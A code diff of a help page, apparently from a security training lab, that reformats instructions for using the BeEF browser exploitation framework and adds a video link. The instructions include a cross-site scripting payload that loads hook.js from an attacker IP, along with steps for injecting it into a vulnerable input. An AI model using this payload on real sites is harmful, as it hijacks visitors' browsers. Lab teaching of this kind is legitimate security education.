@@ -32,16 +32,22 @@
 				<li>Verify the "Hook URL" works. This can be done on the attacker machine. Simply
 				open a web browser and paste the "Hook URL". Verify the contents of the BeEF JavaScript hook.js
 				is visible. It is quite lengthly and will be obvious.</li>
-				<li>Create a cross-site script with the "Hook URL" as the value of the "src" (source) attribute.</li>
+				<li>Create a cross-site script with the "Hook URL" as the value of the "src" (source) attribute.
+
+<br/>
 <code>
 	&lt;script src=&quot;BEEF HOOK URL GOES HERE&quot;&gt;&lt;/script&gt;
-</code> 
+</code>
 <br/>
-				<li>An example is</li>
+</li>
+
+				<li>An example is
+<br/>
 <code>
 	&lt;script src=&quot;http://10.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;
 </code>
-				<br />
+<br/>				
+				</li>
 				<li>Inject this cross-site script into a vulerable input parameter</li>
 				<li>The browser will download and run hook.js from the attacker host
 				infecting the browser. The hook.js causes the browser to reach out to
@@ -62,3 +68,13 @@
 				<li>Command output can be viewed by clicking the respective record 
 				in the "Module Result History" tab</li>
 			</ul>
+			<br/><br/>
+			<span class="report-header">Videos</span>
+			<br/><br/>
+			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontotheBrowserExploitationFramework);?>
+			<br/><br/>
+
+			
+			
+			
+	
